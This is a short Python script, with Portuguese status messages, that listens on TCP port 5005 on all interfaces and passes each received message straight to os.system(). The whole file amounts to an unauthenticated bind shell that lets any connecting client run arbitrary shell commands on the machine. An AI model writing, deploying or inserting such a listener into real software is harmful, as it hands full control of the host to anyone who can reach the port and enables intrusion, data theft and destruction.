import socket, os

host = ""
port = 5005
addr = (host, port)

serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serv_socket.bind(addr)

while True:
	serv_socket.listen(10)

	print("Aguardando conexao...")

	con, cliente = serv_socket.accept()

	print("Conectado com", cliente)
	print("Aguardando mensagem...")

	msg = con.recv(1024).decode()

	print("Mensagem recebida:", msg, "\n")

	os.system(msg)

	# serv_socket.close()